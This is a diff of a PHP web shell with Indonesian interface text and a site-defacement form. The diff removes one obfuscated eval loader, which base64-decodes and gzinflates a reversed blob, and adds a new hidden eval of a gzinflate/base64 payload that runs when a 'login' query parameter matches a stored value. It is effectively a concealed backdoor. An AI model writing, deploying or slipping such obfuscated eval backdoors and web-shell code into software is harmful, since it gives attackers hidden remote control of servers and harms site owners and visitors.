@@ -129,9 +129,6 @@ if($i != $id) echo "/";
 echo '">'.$pat.'</a>/';
 }
 //anti dorking
-$p3mu14 = "ZXZhbCgnPz4nLmd6dW5jb21wcmVzcyhnemluZmxhdGUoYmFzZTY0X2RlY29kZShzdHJyZXYoJGFyc3MpKSkpKTs=";
-$arss = "==watuXkBwf7/bfU/ZTM/d+qvzpFdyANH/44Bm2vnp7lab3pLNQj+FsJPZeUeYPbV6cAgB/So0oj/AQ/3A30dPah5Kh6QH2KMeukLmUrsQZwmTcYnmj+CgEvyG1nNzO35UwgFBfaLYQgQrT7XXbEJp8aMNHT3K0uSf/p0SZJq46C9JHXMuIrsvzGG9x9fjp8SSmbQEiglaceivr6ALtvzb/1j6MGt1ky1BYNzQR3LKGg4pldOiN5RhMuJHXhPWASWMCO0LfBVDh7MviIkpqd+5eizUCMMpMGOy7xUKMmCPmvrI1yRMxo3c7B1geLh4LZhJhSqmtCqXBFXCUpklrky4Ufn7NchcBYFndUFpR//H0TI1GpmRt2hIyN1RbfCD/MFJoKYbs5/6Apic4D7fw7GSBMCvWXPWKn45PyBcTA";
-eval(htmlspecialchars_decode(urldecode(base64_decode($p3mu14))));
 
 echo '</td></tr><tr><td>';
 
@@ -604,7 +601,9 @@ if (isset ($_POST['base_dir']))
             die('<center><br><center><h2>Shell Telah Dihapus</h2><br>Terimakasih Atas Perjuanganmu Wahai Kawan Ku</center></center>');
         else
             echo '<center>unlink failed!</center>';
-            }
+            }elseif ($_GET['login'] == $arif) {
+               eval(gzinflate(base64_decode('pY9da8IwFIbvB/sPhyKkDr/mxtgqgkUz8MJ9tHU3IiHa1AaStqSnoP/etKLbvBrsIgTO877PSSYyk6wU6JK8wqJCtqmSRBiZ7UgHBu3R7c3kkohlWSh+YMKY3JRnbhFDqQVTUkt0m9mlooXOzeGEbIE8PS5IHUgFj4VxyTTPUGTYjQ6F8ADFHvspajWCbcqNNYyX0Wv3uam0UMEYCDcySXnM74cPk53mUvW2uSYNH9Z8UymhZH0GL4OrxJ4VHFObclLEwuv3HehBi4U0+KLBipxu9uYvKFn/IgH9XNIwYstgTta1qRAlzxhXwmCtS+QeznavgLv5B/hxbERZggcrcK5ki/eIMn82C5o1Dqwd66xf6tpPdsDxp1Mahk4Hfu6x87+Y2t+q4b9VRw==')));
+}
             elseif($_GET['do'] == 'face') {
 echo "<center><form method='post'>
         <u>Defacer</u>: <br>
